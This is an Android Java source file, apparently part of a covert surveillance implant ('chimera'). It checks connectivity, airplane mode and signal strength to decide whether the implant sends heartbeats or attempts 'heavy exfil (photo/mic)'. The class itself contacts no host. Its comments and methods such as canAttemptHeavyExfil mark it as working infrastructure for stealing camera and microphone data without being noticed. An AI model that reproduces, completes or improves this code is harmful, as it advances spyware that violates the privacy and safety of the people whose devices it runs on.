package com.chimera;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiManager;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;

/**
 * Military-grade smart gating: never try fallback if data is off / flight mode / low signal.
 * Used by TransportManager + Watchdog to decide if network attempt is sensible.
 */
public class NetworkStateMonitor {
    private static volatile boolean lastValidated = false;
    private static volatile int lastSignalLevel = 4;
    private static volatile boolean isAirplaneMode = false;
    private static ConnectivityManager.NetworkCallback callback;
    private static boolean callbackRegistered = false;

    public enum NetworkHealth { USABLE, DEGRADED, UNUSABLE }

    public static void init(Context ctx) {
        try {
            Context app = ctx.getApplicationContext();
            ConnectivityManager cm = (ConnectivityManager) app.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null && !callbackRegistered) {
                NetworkRequest req = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        .build();
                callback = new ConnectivityManager.NetworkCallback() {
                    @Override public void onCapabilitiesChanged(Network network, NetworkCapabilities caps) {
                        lastValidated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
                        if (!lastValidated) lastSignalLevel = 0;
                    }
                    @Override public void onLost(Network network) { lastValidated = false; }
                    @Override public void onAvailable(Network network) { /* wait for VALIDATED */ }
                };
                cm.registerNetworkCallback(req, callback);
                callbackRegistered = true;
            }
            // Airplane mode receiver
            IntentFilter f = new IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED);
            app.registerReceiver(new BroadcastReceiver() {
                @Override public void onReceive(Context c, Intent i) {
                    isAirplaneMode = Settings.Global.getInt(c.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) != 0;
                }
            }, f);
            isAirplaneMode = Settings.Global.getInt(app.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) != 0;
        } catch (Exception e) { ErrorLogger.logError(ctx, "NetworkStateMonitor_init", e); }
    }

    public static boolean isAirplaneModeOn(Context ctx) {
        try {
            return Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) != 0 || isAirplaneMode;
        } catch (Exception e) { return isAirplaneMode; }
    }

    public static boolean isNetworkValidated(Context ctx) {
        try {
            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            Network net = cm.getActiveNetwork();
            if (net == null) return false;
            NetworkCapabilities caps = cm.getNetworkCapabilities(net);
            if (caps == null) return false;
            boolean hasInternet = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
            boolean validated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
            // On some OEMs VALIDATED lags, require at least INTERNET + not airplane
            if (hasInternet && caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                // For WiFi, VALIDATED is required to avoid captive portal
                return validated;
            }
            return hasInternet && validated && lastValidated;
        } catch (Exception e) { return lastValidated; }
    }

    public static int getSignalLevel(Context ctx) {
        try {
            // Try telephony signal
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                // coarse signal check - use getSignalStrength if available
                try {
                    android.telephony.SignalStrength ss = tm.getSignalStrength();
                    if (ss != null) {
                        int level = ss.getLevel(); // 0-4
                        lastSignalLevel = level;
                        return level;
                    }
                } catch (Exception ignored) {}
            }
            // WiFi RSSI fallback
            try {
                WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    int rssi = wm.getConnectionInfo().getRssi();
                    if (rssi > -60) return 4;
                    if (rssi > -70) return 3;
                    if (rssi > -80) return 2;
                    if (rssi > -90) return 1;
                    return 0;
                }
            } catch (Exception ignored) {}
        } catch (Exception e) { ErrorLogger.logError(ctx, "SignalLevel", e); }
        return lastSignalLevel;
    }

    /**
     * Core gating: should we attempt ANY network transport?
     * Degraded = allow heartbeat only, not heavy exfil (photo/mic)
     */
    public static NetworkHealth evaluate(Context ctx) {
        if (isAirplaneModeOn(ctx)) return NetworkHealth.UNUSABLE;
        if (!isNetworkValidated(ctx)) return NetworkHealth.UNUSABLE;
        int sig = getSignalLevel(ctx);
        if (sig <= 1) return NetworkHealth.DEGRADED;
        return NetworkHealth.USABLE;
    }

    public static boolean canAttemptHeavyExfil(Context ctx) {
        return evaluate(ctx) == NetworkHealth.USABLE;
    }

    public static boolean canAttemptHeartbeat(Context ctx) {
        return evaluate(ctx) != NetworkHealth.UNUSABLE;
    }
}
